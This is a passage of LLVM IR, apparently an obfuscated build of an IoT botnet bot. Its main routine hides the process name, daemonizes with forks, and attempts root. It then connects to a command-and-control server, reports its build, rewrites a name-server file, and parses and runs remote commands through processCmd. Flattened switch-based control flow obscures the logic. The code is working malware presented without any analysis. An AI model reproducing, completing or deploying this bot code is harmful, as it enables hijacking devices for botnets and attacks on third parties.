  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -1367731021, i32 1234750561
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 841397243, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 841397243, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i32 0, i32 0), i32 0) #5
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1344748433, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1344748433, label %first
    i32 2103591978, label %9
    i32 1557468025, label %17
    i32 1540978480, label %18
    i32 1438448460, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ne i32 %.reload, -1
  %8 = select i1 %7, i32 2103591978, i32 1557468025
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.122, i32 0, i32 0), i8** %2, align 8
  %10 = load i8*, i8** %2, align 8
  %11 = call i64 @strlen(i8* %10) #9
  store i64 %11, i64* %3, align 8
  %12 = load i16, i16* %1, align 2
  %13 = zext i16 %12 to i32
  %14 = load i8*, i8** %2, align 8
  %15 = load i64, i64* %3, align 8
  %16 = call i64 @write(i32 %13, i8* %14, i64 %15)
  store i32 1540978480, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 1438448460, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i16, i16* %1, align 2
  %20 = zext i16 %19 to i32
  %21 = call i32 @close(i32 %20)
  store i32 1438448460, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %18, %17, %9, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 4
  %switchVar = alloca i32
  store i32 588686510, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 588686510, label %first
    i32 471115631, label %49
    i32 -1773878383, label %52
    i32 -258910149, label %56
    i32 -1559409428, label %60
    i32 586253113, label %61
    i32 -246153238, label %65
    i32 -1504207506, label %66
    i32 211717736, label %67
    i32 1203777309, label %68
    i32 -543281001, label %69
    i32 -292573103, label %70
    i32 1531639633, label %71
    i32 465976599, label %76
    i32 436810686, label %80
    i32 -202189980, label %84
    i32 1501045441, label %86
    i32 1513969293, label %91
    i32 -470937270, label %97
    i32 -217677079, label %98
    i32 -572427962, label %104
    i32 -368882111, label %113
    i32 462088681, label %116
    i32 -1832332036, label %122
    i32 -1239983436, label %133
    i32 -91753341, label %136
    i32 1762293820, label %149
    i32 1954176881, label %155
    i32 -2063071171, label %165
    i32 -169497160, label %168
    i32 597560982, label %172
    i32 -170487369, label %173
    i32 -41524932, label %176
    i32 -605073935, label %186
    i32 711425022, label %187
    i32 1038270295, label %193
    i32 26178321, label %194
    i32 1832630459, label %201
    i32 -734560489, label %204
    i32 1647672456, label %210
    i32 1087633811, label %215
    i32 -1455899449, label %217
    i32 1391347471, label %220
    i32 1375769893, label %226
    i32 -1047040832, label %227
    i32 -507577416, label %236
    i32 467667143, label %246
    i32 -1687140888, label %255
    i32 -1032424928, label %257
    i32 869765352, label %263
    i32 345524706, label %265
    i32 -468137701, label %271
    i32 -58576656, label %276
    i32 -25535266, label %278
    i32 -1745418660, label %281
    i32 -551515156, label %286
    i32 2047820838, label %291
    i32 -567880313, label %300
    i32 -397542962, label %305
    i32 -1115931566, label %309
    i32 703676078, label %315
    i32 1592453812, label %338
    i32 1514195224, label %340
    i32 2122315616, label %346
    i32 -132313402, label %347
    i32 1546689670, label %352
    i32 208653771, label %357
    i32 -1847679602, label %360
    i32 -603732323, label %361
    i32 -683818773, label %362
    i32 950231155, label %363
    i32 388397149, label %364
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %47 = icmp ne i32 %.reload, 0
  %48 = select i1 %47, i32 471115631, i32 -1773878383
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %7, align 4
  %51 = call i32 @waitpid(i32 %50, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp ne i32 %53, 0
  %55 = select i1 %54, i32 -543281001, i32 -258910149
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = call i32 @fork() #5
  store i32 %57, i32* %8, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -1559409428, i32 586253113
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %8, align 4
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 -1504207506, i32 -246153238
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 211717736, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 211717736, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 1203777309, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -292573103, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 -292573103, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 1531639633, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0)) #5
  %73 = call i32 @setuid(i32 0) #5
  %74 = call i32 @seteuid(i32 0) #5
  %75 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  store i32 465976599, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call i32 @fork() #5
  %78 = icmp eq i32 %77, 0
  %79 = select i1 %78, i32 436810686, i32 388397149
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = call i32 @initConnection()
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -202189980, i32 1501045441
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = call i32 @sleep(i32 5)
  store i32 465976599, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = call i8* @getBuild()
  %89 = call i32 @getEndianness()
  %90 = call i32 (i32, i8*, ...) @sockprintf(i32 %87, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.130, i32 0, i32 0), i8* %88, i32 %89)
  call void @UpdateNameSrvs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 1513969293, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %94 = call i32 @recvLine(i32 %92, i8* %93, i32 4096)
  store i32 %94, i32* %11, align 4
  %95 = icmp ne i32 %94, -1
  %96 = select i1 %95, i32 -470937270, i32 950231155
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 -217677079, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = load i64, i64* @numpids, align 8
  %102 = icmp ult i64 %100, %101
  %103 = select i1 %102, i32 -572427962, i32 -41524932
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32*, i32** @pids, align 8
  %106 = load i32, i32* %12, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %105, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @waitpid(i32 %109, i32* null, i32 1)
  %111 = icmp sgt i32 %110, 0
  %112 = select i1 %111, i32 -368882111, i32 597560982
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %12, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %14, align 4
  store i32 462088681, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %14, align 4
  %118 = zext i32 %117 to i64
  %119 = load i64, i64* @numpids, align 8
  %120 = icmp ult i64 %118, %119
  %121 = select i1 %120, i32 -1832332036, i32 -91753341
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %14, align 4
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds i32, i32* %123, i64 %125
  %127 = load i32, i32* %126, align 4
  %128 = load i32*, i32** @pids, align 8
  %129 = load i32, i32* %14, align 4
  %130 = sub i32 %129, 1
  %131 = zext i32 %130 to i64
  %132 = getelementptr inbounds i32, i32* %128, i64 %131
  store i32 %127, i32* %132, align 4
  store i32 -1239983436, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %14, align 4
  %135 = add i32 %134, 1
  store i32 %135, i32* %14, align 4
  store i32 462088681, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %14, align 4
  %139 = sub i32 %138, 1
  %140 = zext i32 %139 to i64
  %141 = getelementptr inbounds i32, i32* %137, i64 %140
  store i32 0, i32* %141, align 4
  %142 = load i64, i64* @numpids, align 8
  %143 = add i64 %142, -1
  store i64 %143, i64* @numpids, align 8
  %144 = load i64, i64* @numpids, align 8
  %145 = add i64 %144, 1
  %146 = mul i64 %145, 4
  %147 = call noalias i8* @malloc(i64 %146) #5
  %148 = bitcast i8* %147 to i32*
  store i32* %148, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 1762293820, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %14, align 4
  %151 = zext i32 %150 to i64
  %152 = load i64, i64* @numpids, align 8
  %153 = icmp ult i64 %151, %152
  %154 = select i1 %153, i32 1954176881, i32 -169497160
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32*, i32** @pids, align 8
  %157 = load i32, i32* %14, align 4
  %158 = zext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = load i32*, i32** %13, align 8
  %162 = load i32, i32* %14, align 4
  %163 = zext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  store i32 %160, i32* %164, align 4
  store i32 -2063071171, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32, i32* %14, align 4
  %167 = add i32 %166, 1
  store i32 %167, i32* %14, align 4
  store i32 1762293820, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32*, i32** @pids, align 8
  %170 = bitcast i32* %169 to i8*
  call void @free(i8* %170) #5
  %171 = load i32*, i32** %13, align 8
  store i32* %171, i32** @pids, align 8
  store i32 597560982, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  store i32 -170487369, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %12, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %12, align 4
  store i32 -217677079, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %178
  store i8 0, i8* %179, align 1
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %180)
  %181 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %182 = call i8* @strstr(i8* %181, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0)) #9
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %184 = icmp eq i8* %182, %183
  %185 = select i1 %184, i32 -605073935, i32 711425022
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  store i32 1513969293, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %189 = call i8* @strstr(i8* %188, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i32 0, i32 0)) #9
  %190 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %191 = icmp eq i8* %189, %190
  %192 = select i1 %191, i32 1038270295, i32 26178321
  store i32 %192, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:194:                                    ; preds = %loopEntry
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %195, i8** %15, align 8
  %196 = load i8*, i8** %15, align 8
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp eq i32 %198, 33
  %200 = select i1 %199, i32 1832630459, i32 -683818773
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i8*, i8** %15, align 8
  %203 = getelementptr inbounds i8, i8* %202, i64 1
  store i8* %203, i8** %16, align 8
  store i32 -734560489, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8*, i8** %16, align 8
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp ne i32 %207, 32
  %209 = select i1 %208, i32 1647672456, i32 1087633811
  store i32 %209, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i8*, i8** %16, align 8
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp ne i32 %213, 0
  store i32 1087633811, i32* %switchVar
  store i1 %214, i1* %.reg2mem3
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %216 = select i1 %.reload4, i32 -1455899449, i32 1391347471
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8*, i8** %16, align 8
  %219 = getelementptr inbounds i8, i8* %218, i32 1
  store i8* %219, i8** %16, align 8
  store i32 -734560489, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %16, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 0
  %225 = select i1 %224, i32 1375769893, i32 -1047040832
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  store i32 1513969293, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i8*, i8** %16, align 8
  store i8 0, i8* %228, align 1
  %229 = load i8*, i8** %15, align 8
  %230 = getelementptr inbounds i8, i8* %229, i64 1
  store i8* %230, i8** %16, align 8
  %231 = load i8*, i8** %15, align 8
  %232 = load i8*, i8** %16, align 8
  %233 = call i64 @strlen(i8* %232) #9
  %234 = getelementptr inbounds i8, i8* %231, i64 %233
  %235 = getelementptr inbounds i8, i8* %234, i64 2
  store i8* %235, i8** %15, align 8
  store i32 -507577416, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i8*, i8** %15, align 8
  %238 = load i8*, i8** %15, align 8
  %239 = call i64 @strlen(i8* %238) #9
  %240 = sub i64 %239, 1
  %241 = getelementptr inbounds i8, i8* %237, i64 %240
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 10
  %245 = select i1 %244, i32 -1687140888, i32 467667143
  store i32 %245, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i8*, i8** %15, align 8
  %248 = load i8*, i8** %15, align 8
  %249 = call i64 @strlen(i8* %248) #9
  %250 = sub i64 %249, 1
  %251 = getelementptr inbounds i8, i8* %247, i64 %250
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 13
  store i32 -1687140888, i32* %switchVar
  store i1 %254, i1* %.reg2mem5
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %256 = select i1 %.reload6, i32 -1032424928, i32 869765352
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i8*, i8** %15, align 8
  %259 = load i8*, i8** %15, align 8
  %260 = call i64 @strlen(i8* %259) #9
  %261 = sub i64 %260, 1
  %262 = getelementptr inbounds i8, i8* %258, i64 %261
  store i8 0, i8* %262, align 1
  store i32 -507577416, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8*, i8** %15, align 8
  store i8* %264, i8** %17, align 8
  store i32 345524706, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8*, i8** %15, align 8
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp ne i32 %268, 32
  %270 = select i1 %269, i32 -468137701, i32 -58576656
  store i32 %270, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i8*, i8** %15, align 8
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp ne i32 %274, 0
  store i32 -58576656, i32* %switchVar
  store i1 %275, i1* %.reg2mem7
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %277 = select i1 %.reload8, i32 -25535266, i32 -1745418660
  store i32 %277, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i8*, i8** %15, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %15, align 8
  store i32 345524706, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8*, i8** %15, align 8
  store i8 0, i8* %282, align 1
  %283 = load i8*, i8** %15, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %15, align 8
  %285 = load i8*, i8** %17, align 8
  store i8* %285, i8** %18, align 8
  store i32 -551515156, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i8*, i8** %18, align 8
  %288 = load i8, i8* %287, align 1
  %289 = icmp ne i8 %288, 0
  %290 = select i1 %289, i32 2047820838, i32 -567880313
  store i32 %290, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  %292 = load i8*, i8** %18, align 8
  %293 = load i8, i8* %292, align 1
  %294 = zext i8 %293 to i32
  %295 = call i32 @toupper(i32 %294) #9
  %296 = trunc i32 %295 to i8
  %297 = load i8*, i8** %18, align 8
  store i8 %296, i8* %297, align 1
  %298 = load i8*, i8** %18, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %18, align 8
  store i32 -551515156, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %301 = load i8*, i8** %15, align 8
  %302 = call i8* @strtok(i8* %301, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %302, i8** %21, align 8
  %303 = load i8*, i8** %17, align 8
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %303, i8** %304, align 16
  store i32 -397542962, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8*, i8** %21, align 8
  %307 = icmp ne i8* %306, null
  %308 = select i1 %307, i32 -1115931566, i32 1514195224
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8*, i8** %21, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp ne i32 %312, 10
  %314 = select i1 %313, i32 703676078, i32 1592453812
  store i32 %314, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i8*, i8** %21, align 8
  %317 = call i64 @strlen(i8* %316) #9
  %318 = add i64 %317, 1
  %319 = call noalias i8* @malloc(i64 %318) #5
  %320 = load i32, i32* %20, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %321
  store i8* %319, i8** %322, align 8
  %323 = load i32, i32* %20, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %324
  %326 = load i8*, i8** %325, align 8
  %327 = load i8*, i8** %21, align 8
  %328 = call i64 @strlen(i8* %327) #9
  %329 = add i64 %328, 1
  call void @llvm.memset.p0i8.i64(i8* %326, i8 0, i64 %329, i32 1, i1 false)
  %330 = load i32, i32* %20, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  %334 = load i8*, i8** %21, align 8
  %335 = call i8* @strcpy(i8* %333, i8* %334) #5
  %336 = load i32, i32* %20, align 4
  %337 = add nsw i32 %336, 1
  store i32 %337, i32* %20, align 4
  store i32 1592453812, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %339, i8** %21, align 8
  store i32 -397542962, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = load i32, i32* %20, align 4
  %342 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %341, i8** %342)
  %343 = load i32, i32* %20, align 4
  %344 = icmp sgt i32 %343, 1
  %345 = select i1 %344, i32 2122315616, i32 -603732323
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  store i32 -132313402, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i32, i32* %22, align 4
  %349 = load i32, i32* %20, align 4
  %350 = icmp slt i32 %348, %349
  %351 = select i1 %350, i32 1546689670, i32 -1847679602
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i32, i32* %22, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %354
  %356 = load i8*, i8** %355, align 8
  call void @free(i8* %356) #5
  store i32 208653771, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* %22, align 4
  %359 = add nsw i32 %358, 1
  store i32 %359, i32* %22, align 4
  store i32 -132313402, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  store i32 -603732323, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  store i32 -683818773, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  store i32 1513969293, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  store i32 388397149, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  ret i32 0

loopEnd:                                          ; preds = %363, %362, %361, %360, %357, %352, %347, %346, %340, %338, %315, %309, %305, %300, %291, %286, %281, %278, %276, %271, %265, %263, %257, %255, %246, %236, %227, %226, %220, %217, %215, %210, %204, %201, %194, %187, %186, %176, %173, %172, %168, %165, %155, %149, %136, %133, %122, %116, %113, %104, %98, %97, %91, %86, %84, %80, %76, %71, %70, %69, %68, %67, %66, %65, %61, %56, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

